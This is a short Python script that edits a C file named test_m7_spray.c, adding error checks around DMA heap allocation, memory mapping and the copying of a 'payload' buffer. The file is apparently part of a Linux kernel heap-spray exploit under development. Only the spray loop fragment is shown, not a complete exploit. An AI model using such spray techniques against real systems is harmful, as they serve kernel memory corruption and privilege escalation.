with open("tier2/scripts/test_m7_spray.c", "r") as f:
    text = f.read()

text = text.replace("""            ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &alloc);
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, alloc.fd, 0);
            memcpy(p, payload, 4096);""", """            int ret = ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &alloc);
            if (ret < 0) {
                printf("[-] ioctl failed at round %d iter %d\\n", r, i);
                break;
            }
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, alloc.fd, 0);
            if (p == MAP_FAILED) {
                printf("[-] mmap failed at round %d iter %d\\n", r, i);
                break;
            }
            memcpy(p, payload, 4096);""")

with open("tier2/scripts/test_m7_spray.c", "w") as f:
    f.write(text)
